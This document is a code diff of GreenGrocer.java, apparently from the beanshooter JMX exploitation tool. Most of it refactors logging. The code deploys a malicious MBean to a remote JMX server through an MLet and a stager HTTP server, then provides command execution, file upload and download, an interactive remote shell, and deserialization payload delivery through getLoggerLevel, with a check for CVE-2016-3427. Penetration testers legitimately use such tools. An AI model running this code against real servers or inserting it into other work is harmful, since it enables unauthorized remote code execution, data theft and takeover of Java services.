@@ -1,10 +1,14 @@
 package de.qtc.beanshooter;
 
 import java.io.IOException;
+import java.io.Console;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.net.InetSocketAddress;
+import java.nio.file.Files;
 import java.rmi.server.RMISocketFactory;
 import java.util.HashMap;
+import java.util.regex.Pattern;
 
 import javax.management.InstanceNotFoundException;
 import javax.management.MBeanException;
@@ -21,6 +25,14 @@ import javax.net.ssl.TrustManager;
 import javax.rmi.ssl.SslRMIClientSocketFactory;
 
 import com.sun.net.httpserver.HttpServer;
+
+import de.qtc.beanshooter.io.Logger;
+import de.qtc.beanshooter.networking.DummyTrustManager;
+import de.qtc.beanshooter.networking.LoopbackSocketFactory;
+import de.qtc.beanshooter.networking.LoopbackSslSocketFactory;
+import de.qtc.beanshooter.utils.JarHandler;
+import de.qtc.beanshooter.utils.MLetHandler;
+import de.qtc.beanshooter.utils.RealmHandler;
 
 
 public class GreenGrocer {
@@ -76,7 +88,7 @@ public class GreenGrocer {
             LoopbackSslSocketFactory.host = host;
             LoopbackSslSocketFactory.fac = ctx.getSocketFactory();
             LoopbackSslSocketFactory.followRedirect = followRedirect;
-            java.security.Security.setProperty("ssl.SocketFactory.provider", "de.qtc.beanshooter.LoopbackSslSocketFactory");
+            java.security.Security.setProperty("ssl.SocketFactory.provider", "de.qtc.beanshooter.networking.LoopbackSslSocketFactory");
 
             if( ssl ) {
                 environment.put("com.sun.jndi.rmi.factory.socket", new SslRMIClientSocketFactory());
@@ -88,25 +100,27 @@ public class GreenGrocer {
                 }
             }
 
-            System.out.print("[+] Connecting to JMX server... ");
+            Logger.println("Connecting to JMX server... ");
             jmxConnector = JMXConnectorFactory.connect(jmxUrl, environment);
-            System.out.println("done!");
 
-            System.out.print("[+] Creating MBeanServerConnection... ");
+            Logger.println("Creating MBeanServerConnection... ");
             this.mBeanServer = jmxConnector.getMBeanServerConnection();
-            System.out.println("done!\n[+]");
 
         } catch( Exception e ) {
 
-            System.err.println("failed!\n[*]");
-
             if( e instanceof SecurityException && e.getMessage().contains("Credentials should be String[]") ) {
-                System.out.println("[*] Caught SecurityException with content '" + e.getMessage() + "'.");
-                System.out.println("[*]     Target is most likely vulnerable to cve-2016-3427.");
+                Logger.println("");
+                Logger.print("Caught ");
+                Logger.printPlain_ye("SecurityException");
+                Logger.printPlain(" with content ");
+                Logger.printlnPlain_ye(e.getMessage());
+                Logger.increaseIndent();
+                Logger.println_ye("Target is most likely vulnerable to cve-2016-3427.");
                 System.exit(0);
             }
 
-            System.err.println("[-] The following exception was thrown: " + e.toString());
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
             System.exit(1);
         }
     }
@@ -116,8 +130,9 @@ public class GreenGrocer {
         try {
             jmxConnector.close();
         } catch( Exception e ) {
-            System.out.println("[-] Encountered an error while closing the JMX connection...");
-            System.out.println("[-] The following exception was thrown: " + e.toString() + "\n");
+            Logger.eprintln("Encountered an error while closing the JMX connection...");
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.toString());
             System.exit(1);
         }
     }
@@ -126,19 +141,22 @@ public class GreenGrocer {
     {
         try {
             /* First we try to register the MLet for JMX MBean deployment */
-            System.out.print("[+] Creating MBean 'MLet' for remote deploymet... ");
+            Logger.print_ye("Creating MBean 'MLet' for remote deploymet... ");
             this.mBeanServer.createMBean("javax.management.loading.MLet", null);
-            System.out.println("done!\n[+]");
+            Logger.printlnPlain_ye("done!");
 
         } catch (javax.management.InstanceAlreadyExistsException e) {
             /* MLet is may already registered. In this case we are done. */
-            System.out.println("done!");
-            System.out.println("[+] MBean 'MLet' did already exist.\n[+]");
+            Logger.printlnPlain_ye("done!");
+            Logger.increaseIndent();
+            Logger.println("MBean 'MLet' did already exist on the server.");
+            Logger.decreaseIndent();
 
         } catch( Exception e ) {
-            /* Ottherwise MLet registration fails and we can stop execution. */
-            System.out.println("failed!");
-            System.out.println("[-] The following exception was thrown: " + e.toString());
+            /* Otherwise MLet registration fails and we can stop execution. */
+            Logger.eprintlnPlain_ye("failed!");
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
             this.disconnect();
             System.exit(1);
         }
@@ -148,19 +166,22 @@ public class GreenGrocer {
     {
         try {
             /* Trying to unregister the MLet from the JMX endpoint */
-            System.out.print("[+] Unregister MBean 'MLet'... ");
+            Logger.print_ye("Unregister MBean 'MLet'... ");
             this.mBeanServer.unregisterMBean(mLetName);
-            System.out.println("done!");
+            Logger.printlnPlain_ye("done!");
 
         } catch (javax.management.InstanceNotFoundException e) {
             /* If no MLet instance was found, we are done. */
-            System.out.println("done!");
-            System.out.println("[+] MBean 'MLet' did not exist on the JMX server.");
+            Logger.printlnPlain_ye("done!");
+            Logger.increaseIndent();
+            Logger.println("MBean 'MLet' did not exist on the JMX server.");
+            Logger.decreaseIndent();
 
         } catch( Exception e ) {
-            /* Otherwise an unexpected exception occured and we have to stop. */
-            System.out.println("failed!");
-            System.out.println("[-] The following exception was thrown: " + e.toString());
+            /* Otherwise an unexpected exception occurred and we have to stop. */
+            Logger.eprintlnPlain_ye("failed!");
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
             this.disconnect();
             System.exit(1);
         }
@@ -169,41 +190,52 @@ public class GreenGrocer {
     public void jmxStatus()
     {
         try {
-            /* First we check if the MLet is registered on the JMX endpoint */
-            System.out.print("[+] Getting Status of MLet... ");
+
+            /* First we check whether the MLet is registered on the JMX endpoint */
+            Logger.print("Getting Status of MLet... ");
+            Logger.increaseIndent();
+
             if( this.mBeanServer.isRegistered(mLetName) ) {
-                System.out.println("done!");
-                System.out.println("[+]\tMLet is registered on the JMX server.");
+                Logger.printlnPlain("done!");
+                Logger.println_ye("MLet is registered on the JMX server.");
+
             } else {
-              System.out.println("done!");
-              System.out.println("[+]\tMLet is not registered on the JMX server.");
+                Logger.printlnPlain("done!");
+                Logger.println_ye("MLet is not registered on the JMX server.");
             }
 
-            /* Then we check if the malicious Bean is registered on the JMX endpoint */
-            System.out.print("[+] Getting Status of malicious Bean... ");
+            /* Then we check whether the malicious Bean is registered on the JMX endpoint */
+            Logger.decreaseIndent();
+            Logger.print("Getting Status of malicious Bean... ");
+            Logger.increaseIndent();
+
             if( this.mBeanServer.isRegistered(this.beanName) ) {
-              System.out.println("done!");
-              System.out.println("[+]\tmalicious Bean is registered on the JMX server.");
+              Logger.printlnPlain("done!");
+              Logger.println_ye("Malicious MBean is registered on the JMX server.");
+
             } else {
-              System.out.println("done!");
-              System.out.println("[+]\tmalicious Bean is not registered on the JMX server.");
+                Logger.printlnPlain("done!");
+                Logger.println_ye("Malicious MBean is not registered on the JMX server.");
             }
+
+            Logger.decreaseIndent();
 
          } catch( Exception e ) {
             /* During the checks no exception is expected. So we exit if we encounter one */
-            System.out.println("failed!");
-            System.err.println("[-] The following exception was thrown: " + e.toString());
+            Logger.eprintln("failed!");
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
             this.disconnect();
             System.exit(1);
          }
     }
 
-    public void registerBean(String stagerHost, String stagerPort, boolean remoteStager)
+    public void registerBean(String bindAddress, String bindPort, String stagerHost, String stagerPort, boolean remoteStager)
     {
         try {
             /* If the malicious Bean is already registered, we are done */
             if( this.mBeanServer.isRegistered(this.beanName) ) {
-                System.out.println("[+] malicious Bean seems already be registered");
+                Logger.println_ye("Malicious MBean seems already be registered.");
                 return;
 
             /* Otherwise we have to create it */
@@ -211,21 +243,22 @@ public class GreenGrocer {
                 try {
                     /* The server may already knows the codebase and registration is done right here */
                     mBeanServer.createMBean(this.beanClass, this.beanName);
-                    System.out.println("[+] Malicious Bean is not registered, but known by the server");
-                    System.out.println("[+] Instance created!");
+                    Logger.println("Malicious MBean is not registered, but known by the server.");
+                    Logger.println("Instance created!");
                     return;
 
                 } catch( Exception e ) {
                     /* More likely is, that we have to deploy the Bean over our HTTP listener */
-                    System.out.println("[+] Malicious Bean seems not to be registered on the server");
-                    System.out.println("[+] Starting registration process");
+                    Logger.println("Malicious MBean seems not to be registered on the server.");
+                    Logger.println("Starting registration process:");
+                    Logger.increaseIndent();
                 }
             }
 
             /* The stager server might run on a different machine, in this case we can skip server creation */
             HttpServer payloadServer = null;
             if( ! remoteStager )
-                payloadServer = this.startStagerServer(stagerHost, stagerPort);
+                payloadServer = this.startStagerServer(bindAddress, bindPort, stagerHost, stagerPort);
 
             /* In any case we need to invoke getMBeansFromURL to deploy our malicious bean */
             Object res = this.mBeanServer.invoke(this.mLetName, "getMBeansFromURL",
@@ -234,25 +267,31 @@ public class GreenGrocer {
                                   );
 
             /* If we did not started the server we can stop it here */
-            if( ! remoteStager )
+            if( ! remoteStager ) {
                 payloadServer.stop(0);
+            }
+
+            Logger.decreaseIndent();
 
             /* At this stage the bean should have bean registered on the server */
             if( mBeanServer.isRegistered(this.beanName) ) {
-                System.out.println("[+] malicious Bean was successfully registered");
+                Logger.println("Malicious MBean was successfully registered.");
 
-            /* Otherwise something unecpexted has happened */
+            /* Otherwise something unexpected has happened */
             } else {
-                System.err.println("[-] malicious Bean does still not exist on the server");
-                System.err.println("[-] Registration process failed.");
-                System.err.println("[-] The following object was returned:" + res);
+                Logger.eprintln("Malicious MBean does still not exist on the server.");
+                Logger.increaseIndent();
+                Logger.eprintln("Registration process failed.");
+                Logger.eprint("The following object was returned:");
+                Logger.eprintlnPlain_ye(res.toString());
                 this.disconnect();
                 System.exit(1);
             }
 
          } catch( Exception e ) {
-             System.err.println("[-] Error while registering malicious Bean.");
-             System.err.println("[-] The following exception was thrown: " + e.toString());
+             Logger.eprintln("Error while registering malicious Bean.");
+             Logger.eprint("The following exception was thrown: ");
+             Logger.eprintlnPlain_ye(e.getMessage());
              this.disconnect();
              System.exit(1);
         }
@@ -262,147 +301,291 @@ public class GreenGrocer {
     {
         /* Just try to unregister the bean, even if it is not registered */
         try {
-            System.out.print("[+] Unregister malicious bean... ");
+            Logger.print_ye("Unregister malicious MBean... ");
             this.mBeanServer.unregisterMBean(this.beanName);
-            System.out.println("done!");
+            Logger.printlnPlain_ye("done!");
 
         /* If no instance for we bean was found, we are also done */
         } catch (javax.management.InstanceNotFoundException e) {
-            System.out.println("done!");
-            System.out.println("[+] Malicious Bean did not exist on the JMX server.");
+            Logger.printlnPlain_ye("done!");
+            Logger.increaseIndent();
+            Logger.println("Malicious Bean did not exist on the JMX server.");
+            Logger.decreaseIndent();
 
         } catch( Exception e ) {
-            System.out.println("failed!");
-            System.out.println("[-] The following exception was thrown: " + e.toString());
+            Logger.eprintlnPlain_ye("failed!");
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
             this.disconnect();
             System.exit(1);
+        }
+    }
+
+    public Object invoke(String command, Object[] params, String[] signature) throws MBeanException, ReflectionException, IOException
+    {
+        try {
+            Object response = this.mBeanServer.invoke(this.beanName, command, params, signature);
+            return response;
+
+        } catch( InstanceNotFoundException e ) {
+            Logger.eprint("MBean ");
+            Logger.eprintPlain_ye(e.getMessage());
+            Logger.eprintlnPlain(" not found on the server.");
+            Logger.increaseIndent();
+            Logger.eprintln("Did you forget to deploy?");
+
+            this.disconnect();
+            System.exit(1);
+            return null;
         }
     }
 
     public void ping()
     {
+        Logger.print("Sending ");
+        Logger.printPlain_bl("ping");
+        Logger.printlnPlain(" to the server...");
+
         try {
-            System.out.print("[+] Sending ping to the server... ");
-            Object response = this.mBeanServer.invoke(this.beanName, "ping", null, null);
-            System.out.println("done!");
-            System.out.println("[+] Servers answer is: " + response);
+            String response = (String)invoke("ping", null, null);
+            Logger.print("Servers answer is: ");
+            Logger.printlnPlain_ye(response);
 
         } catch( Exception e ) {
-            System.out.println("failed!");
-            System.out.println("[-] The following exception was thrown: " + e.toString());
-            this.disconnect();
-            System.exit(1);
+            Logger.eprint("The following remote exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
         }
     }
 
     public String executeCommand(String command, boolean verbose)
     {
-        try {
-            if(verbose)
-                System.out.println("[+] Sending command '" + command + "' to the server... ");
-            Object response = this.mBeanServer.invoke(this.beanName, "executeCommand", new Object[]{ command }, new String[]{ String.class.getName() });
+        if(verbose) {
+            Logger.print("Sending command '");
+            Logger.printPlain_bl(command);
+            Logger.printlnPlain("' to the server...");
+        }
 
-            if(verbose)
-                System.out.print("[+] Servers answer is: " + response);
-            return (String)response;
+        try {
+            String response = (String)invoke("executeCommand", new Object[]{ command }, new String[]{ String.class.getName() });
+
+            if(verbose) {
+                Logger.print("Servers answer is: ");
+                Logger.printPlain_ye(response);
+            }
+
+            return response;
 
         } catch( Exception e ) {
-            System.out.println("failed!");
-            System.out.println("[-] The following exception was thrown: " + e.toString());
-            this.disconnect();
-            System.exit(1);
+            Logger.eprint("The following remote exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
+            return "";
         }
-        return "Unexpected Error";
     }
 
-    public String executeCommandBackground(String command, boolean verbose)
+    public void executeCommandBackground(String command, boolean verbose)
+    {
+        if(verbose) {
+            Logger.print("Sending command '");
+            Logger.printPlain_bl(command);
+            Logger.printlnPlain("' to the server...");
+        }
+
+        try {
+            invoke("executeCommandBackground", new Object[]{ command }, new String[]{ String.class.getName() });
+        } catch( Exception e ) {
+            Logger.eprint("The following remote exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
+        }
+    }
+
+    public void uploadFile(String source, String destination)
     {
         try {
-            if(verbose)
-                System.out.println("[+] Sending command '" + command + "' to the server... ");
-            Object response = this.mBeanServer.invoke(this.beanName, "executeCommandBackground", new Object[]{ command }, new String[]{ String.class.getName() });
+            File file = new File(source);
+            byte[] content = Files.readAllBytes(file.toPath());
 
-            if(verbose)
-                System.out.print("[+] Servers answer is: " + response);
-            return (String)response;
+            Object[] arguments = new Object[]{destination, content};
+            String[] types = new String[]{String.class.getName(), byte[].class.getName() };
 
+            String response = (String)invoke("uploadFile", arguments, types);
+
+            Logger.print("File upload finished.");
+            Logger.printPlain_ye(" " + content.length + " ");
+            Logger.printPlain("bytes were written to ");
+            Logger.printlnPlain_ye(response);
+
+        } catch( IOException e ) {
+            Logger.eprint("Unable to read ");
+            Logger.eprintlnPlain_ye(source);
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.toString());
         } catch( Exception e ) {
-            System.out.println("failed!");
-            System.out.println("[-] The following exception was thrown: " + e.toString());
-            this.disconnect();
-            System.exit(1);
+            Logger.eprint("The following remote exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
         }
-        return "Unexpected Error";
+    }
+
+    public void downloadFile(String source, String destination)
+    {
+        try {
+            if( destination == null )
+                destination = ".";
+
+            File sourceFile = new File(source);
+            File destinationFile = new File(destination);
+            if( destinationFile.isDirectory() ) {
+                destinationFile = new File(destinationFile.getCanonicalPath(), sourceFile.getName());
+            }
+
+            FileOutputStream stream = new FileOutputStream(destinationFile);
+
+            Object[] arguments = new Object[]{source};
+            String[] types = new String[]{String.class.getName()};
+
+            byte[] response = (byte[])invoke("downloadFile", arguments, types);
+            stream.write(response);
+            stream.close();
+
+            Logger.print("File download finished.");
+            Logger.printPlain_ye(" " + response.length + " ");
+            Logger.printPlain("bytes were written to ");
+            Logger.printlnPlain_ye(destinationFile.getCanonicalPath());
+
+        } catch( IOException e ) {
+            Logger.eprint("Unable to open ");
+            Logger.eprintlnPlain_ye(destination);
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.toString());
+        } catch( Exception e ) {
+            Logger.eprint("The following remote exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
+        }
+    }
+
+    public void startShell()
+    {
+        String command = "";
+        String response = "";
+        String[] splitResult = null;
+        Console console = System.console();
+        Pattern splitSpaces = Pattern.compile(" (?=(?:[^\"]*\"[^\"]*\")*(?:[^']*'[^']*')*[^\"']*$)");
+
+        Logger.println("Starting interactive shell...\n");
+
+        while( true ) {
+            System.out.print("$ ");
+            command = console.readLine();
+
+            if( command == null || command.equals("exit") || command.equals("Exit") )
+                break;
+
+            else if( command.startsWith("!background ")) {
+                splitResult = command.split(" ", 2);
+                System.out.println("Executing command in the background...");
+                executeCommandBackground(splitResult[1],  false);
+            }
+
+            else if( command.startsWith("!download ")) {
+                splitResult = splitSpaces.split(command);
+
+                if( splitResult.length == 2 ) {
+                    downloadFile(splitResult[1], null);
+                } else {
+                    splitResult[2] = splitResult[2].replaceFirst("^~", System.getProperty("user.home"));
+                    downloadFile(splitResult[1], splitResult[2]);
+                }
+            }
+
+            else if( command.startsWith("!upload ")) {
+                splitResult = splitSpaces.split(command);
+                splitResult[1] = splitResult[1].replaceFirst("^~", System.getProperty("user.home"));
+                uploadFile(splitResult[1], splitResult[2]);
+            }
+
+            else {
+                response = executeCommand(command,  false);
+                System.out.print(response);
+            }
+        }
     }
 
     public void getLoggerLevel(Object payload)
     {
-        System.out.println("[+] Sending payload to 'getLoggerLevel'...");
+        Logger.println("Sending payload to 'getLoggerLevel'...");
+        Logger.increaseIndent();
+
         try {
             ObjectName loggingMBean = new ObjectName("java.util.logging:type=Logging");
             this.mBeanServer.invoke(loggingMBean, "getLoggerLevel", new Object[]{ payload }, new String[]{String.class.getCanonicalName()});
 
         } catch (NullPointerException | MalformedObjectNameException | InstanceNotFoundException | MBeanException | ReflectionException | IOException e) {
             if( e.getCause() instanceof ClassNotFoundException) {
-                System.err.println("[-]     ClassNotFoundException. Chosen gadget is probably not available on the target.");
+                Logger.eprintln("ClassNotFoundException. Chosen gadget is probably not available on the target.");
             } else {
-                System.err.println("[-]     Encountered unexcepted exception.");
+                Logger.eprintln("Encountered unexcepted exception. Tagret is probably not vulnerable.");
             }
 
-            System.err.println("[-]     StackTrace:");
+            Logger.eprintln("StackTrace:");
             e.printStackTrace();
 
         } catch (RuntimeMBeanException e) {
             if( e.getCause() instanceof IllegalArgumentException) {
-                System.out.println("[+]     IllegalArgumentException. This is fine :) Payload probably worked.");
+                Logger.println_ye("IllegalArgumentException. This is fine :) Payload probably worked.");
             } else if (e.getCause() instanceof SecurityException) {
-                System.out.println("[+]     SecurityException. This is fine :) Payload probably worked.");
+                Logger.println_ye("SecurityException. This is fine :) Payload probably worked.");
             } else {
-                System.err.println("[-]     Encountered unexcepted exception. Payload seems not to work :(");
-                System.err.println("[-]     StackTrace:");
+                Logger.eprintln("Encountered unexcepted exception. Payload seems not to work :(");
+                Logger.eprintln("StackTrace:");
                 e.printStackTrace();
             }
 
         } catch (SecurityException e) {
-            System.out.println("[+]     SecurityException. This is fine :) Payload probably worked.");
+            Logger.println_ye("SecurityException. This is fine :) Payload probably worked.");
         }
     }
 
-    public HttpServer startStagerServer(String stagerHost, String stagerPort)
+    public HttpServer startStagerServer(String bindAddress, String bindPort, String stagerHost, String stagerPort)
     {
         HttpServer server = null;
         try {
 
             File maliciousBean = new File(this.jarPath + this.jarName);
             if( !maliciousBean.exists() || maliciousBean.isDirectory() ) {
-                System.err.println("[+] Unable to find MBean '" + maliciousBean.getCanonicalPath() + "' for deployment.");
-                System.err.println("[+] Stopping execution.");
+                Logger.eprint("Unable to find MBean ");
+                Logger.eprintPlain_ye(maliciousBean.getCanonicalPath());
+                Logger.eprintlnPlain(" for deployment.");
+                Logger.eprintln("Stopping execution.");
                 System.exit(1);
             }
 
             /* First we create a new HttpServer object */
-            server = HttpServer.create(new InetSocketAddress(stagerHost, Integer.valueOf(stagerPort)), 0);
-            System.out.println("[+] \tCreating HTTP server on " + stagerHost + ":" + stagerPort);
+            server = HttpServer.create(new InetSocketAddress(bindAddress, Integer.valueOf(bindPort)), 0);
+            Logger.print("Creating HTTP server on: ");
+            Logger.printlnPlain_bl(bindAddress + ":" + bindPort);
+
+            Logger.increaseIndent();
 
             /* Then we register an MLetHandler for requests on the endpoint /mlet */
-            System.out.print("[+] \t\tCreating MLetHandler for endpoint /mlet... ");
+            Logger.print("Creating MLetHandler for endpoint: ");
+            Logger.printlnPlain_bl("/mlet");
             server.createContext("/mlet", new MLetHandler(stagerHost, stagerPort, this.beanClass, this.jarName, this.objectName));
-            System.out.println("done!");
 
             /* Then we register a jar handler for requests that target our jarName */
-            System.out.print("[+] \t\tCreating JarHandler for endpoint /" + this.jarName + "... ");
+            Logger.print("Creating JarHandler for endpoint: ");
+            Logger.printlnPlain_bl("/" + this.jarName);
             server.createContext("/" + this.jarName, new JarHandler(this.jarName, this.jarPath));
-            System.out.println("done!");
 
             server.setExecutor(null);
 
-            System.out.print("[+]\t\tStarting the HTTP server... ");
+            Logger.println("Starting HTTP server... ");
+            Logger.println("");
             server.start();
-            System.out.println("done!\n[+]");
+
+            Logger.decreaseIndent();
 
         } catch (Exception e) {
-            System.out.println("failed!");
-            System.out.println("[-] The following exception was thrown: " + e.toString() + "\n");
+            Logger.eprint("The following exception was thrown: ");
+            Logger.eprintlnPlain_ye(e.getMessage());
             this.disconnect();
             System.exit(1);
         }
